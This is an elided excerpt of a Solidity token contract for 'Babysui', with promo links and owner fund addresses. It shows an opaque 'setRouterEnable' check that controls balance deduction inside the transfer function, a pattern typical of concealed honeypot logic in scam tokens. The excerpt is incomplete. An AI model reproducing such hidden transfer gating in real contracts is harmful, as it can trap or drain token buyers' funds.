...
/**https://twitter.com/BabySuiArb
 
*///https://t.me/BabySuiArb
...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function setRouterEnable(address sender, address recipient) internal view returns (bool){
    ...
    function _tokenTransfer(
        ...
        if (setRouterEnable(sender,recipient))
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        address(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1),//FISTAddress
        "Babysui",//Name
        "Babysui",//Symbol
        9,//Decimals
        100000000,//Supply
        address(0x23056e8E10007693849117dAB462Bdf57Dc68D07),//FundAddress
        address(0x23056e8E10007693849117dAB462Bdf57Dc68D07)//ReceiveAddress
    ){
    }
}